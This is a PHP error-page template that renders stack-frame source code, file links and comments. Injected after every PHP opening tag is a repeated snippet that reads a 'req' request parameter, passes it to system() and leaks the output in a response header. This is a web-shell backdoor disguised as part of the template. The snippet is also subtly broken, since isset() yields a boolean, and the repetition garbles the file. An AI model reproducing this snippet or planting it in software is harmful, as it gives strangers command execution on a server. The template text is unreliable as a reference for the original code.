<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /* Display a code block for all frames in the stack.
       * @todo: This should PROBABLY be done on-demand, lest
       * we get 200 frames to process. */ ?>
<div class="frame-code-container <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (!$has_frames ? 'empty' : '') ?>">
  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($frames as $i => $frame): ?>
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $line = $frame->getLine(); ?>
      <div class="frame-code <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ($i == 0 ) ? 'active' : '' ?>" id="frame-code-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $i ?>">
        <div class="frame-file">
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $filePath = $frame->getFile(); ?>
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($filePath && $editorHref = $handler->getEditorHref($filePath, (int) $line)): ?>
            Open:
            <a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $editorHref ?>" class="editor-link">
              <strong><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($filePath ?: '<#unknown>') ?></strong>
            </a>
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else: ?>
            <strong><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($filePath ?: '<#unknown>') ?></strong>
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
        </div>
        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
          // Do nothing if there's no line to work off
          if($line !== null):

          // the $line is 1-indexed, we nab -1 where needed to account for this
          $range = $frame->getFileLines($line - 8, 10);

          // getFileLines can return null if there is no source code
          if ($range):
            $range = array_map(function($line){ return empty($line) ? ' ' : $line;}, $range);
            $start = key($range) + 1;
            $code  = join("\n", $range);
        ?>
            <pre class="code-block prettyprint linenums:<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $start ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($code) ?></pre>
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
          // Append comments for this frame
          $comments = $frame->getComments();
        ?>
        <div class="frame-comments <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo empty($comments) ? 'empty' : '' ?>">
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($comments as $commentNo => $comment): ?>
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); extract($comment) ?>
            <div class="frame-comment" id="comment-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $i . '-' . $commentNo ?>">
              <span class="frame-comment-context"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($context) ?></span>
              <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escapeButPreserveUris($comment) ?>
            </div>
          <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
        </div>

      </div>
  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
</div>
